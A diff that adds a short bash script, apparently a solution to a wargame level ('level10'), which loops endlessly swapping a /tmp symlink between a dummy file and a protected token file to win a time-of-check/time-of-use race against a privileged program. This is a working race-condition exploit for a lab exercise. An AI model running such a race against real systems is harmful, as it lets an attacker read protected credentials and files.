@@ -1,0 +1,8 @@
+#!/bin/bash
+
+echo "script running ..."
+while true; do
+    ln -sf "/tmp/fakelink" "/tmp/link"
+    ln -sf "/home/user/level10/token" "/tmp/link"
+done
+
